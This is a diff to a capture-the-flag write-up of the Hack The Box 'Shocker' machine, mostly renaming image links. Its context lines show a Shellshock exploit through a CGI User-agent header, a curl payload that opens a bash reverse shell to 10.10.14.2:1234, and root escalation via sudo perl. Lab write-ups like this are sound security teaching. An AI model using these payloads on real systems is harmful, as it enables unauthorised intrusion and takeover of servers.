@@ -18,7 +18,7 @@ nmap -sC -sV shocker.htb > nmap.txt
 
 Visiting the webpage I see a simple image of a bug saying “Don’t Bug Me!”
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%201.png)
+![Untitled](POC/website.png)
 
 Checking the source doesnt reveal any further information as well.
 
@@ -38,17 +38,17 @@ Checking the source doesnt reveal any further information as well.
 
 Since I can’t find any giveaways on the page itself, I’ll run dirb to brute force some possible directories. I find a directory by the name of `cgi-bin/` which seems interesting to me, I should google this directory name and see if I can find any vulnerabilities.
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%202.png)
+![Untitled](POC/dirb.png)
 
 After doing some research, it seems that cgi-bin is a directory containing CGI scripts which can be used to call out to applications hosted on the server. 
 
 After a bit more digging, it seems that CGI scripts are typically shell, cgi, or perl scripts. I will run dirb again against the cgi-bin directory, this time searching for shell scripts. This reveals `/cgi-bin/user.sh`
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%203.png)
+![Untitled](POC/dirb2.png)
 
 Traveling to the address prompts me to download the script, which I do. I’ll cat the file out to see what its contents are. The contents look like the results of the `uptime` command. So this is probably a script ruinning on the box.
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%204.png)
+![Untitled](POC/shell_script.png)
 
 ## Shellshock
 
@@ -73,9 +73,9 @@ If an Apache server has CGI enabled, this can be exploited. To test this, I send
 curl -H "User-agent: () { :;}; echo; echo vulnerable" http://shocker.htb:80/cgi-bin/user.sh
 ```
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%205.png)
+![Untitled](POC/vulnerable.png)
 
-Looks like we can leverage this exploit!
+Looks like this system is vulnerable!
 
 # Exploitation
 
@@ -87,7 +87,7 @@ I set up a netcat listener on port 1234 and send the following payload to receiv
 curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.2/1234 0>&1" http://shocker.htb:80/cgi-bin/user.sh
 ```
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%206.png)
+![Untitled](POC/reverse_shell.png)
 
 We’re in!
 
@@ -95,7 +95,7 @@ We’re in!
 
 Running `whoami` we can see we are the user shelly, first I’ll navigate to the users home directory and grab the user flag.
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%207.png)
+![Untitled](POC/user_flag.png)
 
 # Privelege Escalation
 
@@ -103,7 +103,7 @@ Running `whoami` we can see we are the user shelly, first I’ll navigate to the
 
 The first thing I always do to check for possible privelege escalation vectors is running the `sudo -l` command because of how quick it is. In this case it looks like shelly is able to run perl as root, this will be easy!
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%208.png)
+![Untitled](POC/shelly_sudo.png)
 
 ## Perl
 
@@ -117,10 +117,10 @@ sudo /usr/bin/perl -e 'exec "/bin/sh";'
 
 With my new shell launched, I run `whoami` once more to reveal that I am now root.
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%209.png)
+![Untitled](POC/root.png)
 
 ## Root Flag
 
 Now all that needs to be done is navigate to the root directory and grab the root flag!
 
-![Untitled](Shocker%20e328b70ca7964b4abdf06a6b715b9edc/Untitled%2010.png)
+![Untitled](POC/root_flag.png)
